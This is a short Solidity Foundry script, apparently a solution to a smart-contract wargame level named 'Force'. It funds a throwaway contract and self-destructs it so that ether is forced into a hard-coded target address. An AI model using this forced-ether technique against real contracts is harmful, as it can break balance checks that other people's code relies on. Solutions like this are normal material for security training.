/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract SelfDestruct {
    function selfDestruct(address _addr) public {
        address payable addr = payable(_addr);
        selfdestruct(addr);
    }

    receive() external payable {}
}

contract Force is Script {
    function run() public {
        vm.startBroadcast();

        SelfDestruct selfDestruct = new SelfDestruct();
        address payable _selfDestruct = payable(address(selfDestruct));
        _selfDestruct.transfer(0.0001 ether);
        selfDestruct.selfDestruct(0x858f3dF6463D05900D38aDaf55adB2fED34c888a);

        vm.stopBroadcast();
    }
}
